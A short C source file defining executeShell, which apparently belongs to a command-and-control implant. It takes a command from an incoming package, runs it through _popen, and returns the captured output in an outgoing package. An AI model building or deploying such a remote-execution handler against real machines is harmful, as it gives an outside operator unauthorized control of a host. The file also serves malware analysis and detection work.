#include "Shell.h"

PPackage executeShell(PParser arguments)
{
	UINT32 nbArg = getInt32(arguments);
	SIZE_T size = 0;
	PCHAR cmd = getString(arguments, &size); // will read first UINT32 as size of param
	cmd = (PCHAR)LocalReAlloc(cmd, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
	if (!cmd)
	{
		_err("[SHELL] Error in executeShell command");
		return NULL;
	}

	FILE* fp;
	CHAR path[1035];
	PPackage output = newPackage(0, FALSE);

	fp = _popen(cmd, "rb");
	if (!fp)
	{
		_err("[SHELL] Error in executeShell command");

		// Cleanup memory
		freePackage(output);
		LocalFree(cmd);

		return NULL;
	}
	while (fgets(path, sizeof(path), fp) != nullptr)
	{
		addString(output, path, FALSE);
	}

	_pclose(fp);
	LocalFree(cmd);

	return output;

}
